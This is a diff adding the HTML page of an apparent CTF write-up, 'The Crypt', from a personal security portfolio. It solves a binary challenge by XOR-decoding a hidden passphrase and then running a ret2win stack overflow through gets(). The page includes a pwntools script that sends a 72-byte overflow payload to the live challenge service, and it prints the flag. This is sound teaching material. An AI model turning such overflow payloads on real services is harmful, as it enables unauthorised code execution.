@@ -1,0 +1,62 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>The Crypt — Writeup — arwah</title><meta name="description" content="A 513 MiB &quot;mystery&quot; file is 99.996% random padding — the real artifact is a tiny non-PIE x86-64 ELF glued to the front. Stage 1 hides a secret code in .data (XOR 0x13, cheekily named…"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Binary Exploitation · 2 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#summary">Summary</a></li><li><a href="#recon">Recon</a></li><li><a href="#stage-1-the-secret-code">Stage 1 — the secret code</a></li><li><a href="#stage-2-ret2win">Stage 2 — ret2win</a></li><li><a href="#red-herrings-checked-and-dismissed">Red herrings checked and dismissed</a></li></ul></details><article class="prose"><h1 id="the-crypt-writeup">The Crypt — Writeup</h1>
+<p><strong>Category:</strong> Pwn / Reverse Engineering
+<strong>Flag:</strong> <code>deadface{d3crypt3d_1nt0_n0th1ng}</code></p>
+<h2 id="summary">Summary</h2>
+<p>A 513 MiB &quot;mystery&quot; file is 99.996% random padding — the real artifact is a tiny
+non-PIE x86-64 ELF glued to the front. Stage 1 hides a secret code in <code>.data</code>
+(XOR <code>0x13</code>, cheekily named <code>nothing_at_all</code>); stage 2 is a textbook stack
+overflow (<code>gets()</code>) with an uncalled win function <code>nowhere()</code> that prints
+<code>flag.txt</code>. Fittingly, the &quot;door to nowhere&quot; <em>is</em> the ret2win.</p>
+<h2 id="recon">Recon</h2>
+<p>The download is a single 513 MiB file. Section headers show the actual ELF ends
+at <code>0x51a8</code> (~21 KB); everything after is statistically pure <code>/dev/urandom</code>
+(uniform χ² per MiB, zero repeated 4 KiB blocks, IC exactly 1/256 at all key
+lengths, no container magic anywhere). The padding is a decoy — the author even
+winks at it with the symbol name <code>nothing_at_all</code>.</p>
+<pre><code>$ file The_Crypt
+ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+</code></pre>
+<p>Symbols of interest: <code>main</code>, <code>print_art</code>, <code>slowtype</code>, <code>de_crypt</code>, <code>nowhere</code>,
+<code>whispering_madness</code>.</p>
+<h2 id="stage-1-the-secret-code">Stage 1 — the secret code</h2>
+<p><code>de_crypt()</code> XORs the blob at <code>nothing_at_all</code> (0x405080) with <code>0x13</code> into a
+stack buffer, and <code>main</code> <code>strcmp</code>s it against user input:</p>
+<pre><code class="language-python">data = open('The_Crypt','rb').read()
+blob = data[0x4080:0x40a0]                    # file offset of .data
+bytes(b ^ 0x13 for b in blob.split(b'\x00')[0])
+# b'Open_The_Door_To_Nowhere'
+</code></pre>
+<p>Entering <code>Open_The_Door_To_Nowhere</code> passes the gate and drops you into
+<code>whispering_madness()</code>:</p>
+<pre><code>[!] &quot;WHO DARES ATTEMPT TO ENTER THE FORGOTTEN REALM?!&quot;:
+</code></pre>
+<h2 id="stage-2-ret2win">Stage 2 — ret2win</h2>
+<p><code>whispering_madness()</code> reads with <code>gets()</code> into a 64-byte stack buffer
+(<code>rbp-0x40</code>). The binary is non-PIE (base <code>0x400000</code>), compiled without a stack
+canary, and <code>nowhere()</code> (0x401660) — which <code>fopen</code>s <code>flag.txt</code> and echoes it —
+is never called from <code>main</code>. Offset to saved RIP: 64 + 8 = <strong>72</strong>.</p>
+<pre><code class="language-python">payload = b&quot;A&quot; * 72 + p64(0x401660)           # -&gt; nowhere()
+</code></pre>
+<p>Verified locally (win function executes), then run against the live service:</p>
+<pre><code class="language-python">io = remote(HOST, 5001)
+io.sendlineafter(b&quot;Secret Code Required): &quot;, b&quot;Open_The_Door_To_Nowhere&quot;)
+io.sendlineafter(b'FORGOTTEN REALM?!&quot;:', payload)
+print(io.recvall(timeout=10).decode(errors=&quot;ignore&quot;))
+</code></pre>
+<pre><code>deadface{d3crypt3d_1nt0_n0th1ng}
+</code></pre>
+<h2 id="red-herrings-checked-and-dismissed">Red herrings checked and dismissed</h2>
+<ul>
+<li><strong>513 MiB &quot;container&quot; theory</strong> — tested AES-256-XTS header decryption
+(VeraCrypt/TrueCrypt KDFs and iterations, correct per-sector XTS data-unit
+numbers for primary/hidden/backup header offsets) with <code>cryptsetup</code> and a
+hand-rolled XTS implementation: no <code>VERA</code>/<code>TRUE</code> magic anywhere. It's just
+random filler.</li>
+<li><strong>ASCII art steganography</strong> — the art uses 9 distinct characters; per-character
+maps are scattered noise, not data.</li>
+<li><strong>PRNG keystreams</strong> — glibc <code>rand()</code>, MT19937 with plausible seeds, and the
+binary's own LCG (seed <code>0x1337</code>) all failed to reveal structure.</li>
+<li><strong>Constant-XOR hidden flag</strong> — an XOR-difference scan for <code>deadface{</code> /
+<code>flag{</code> over the full 513 MiB found only coincidences.</li>
+</ul>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
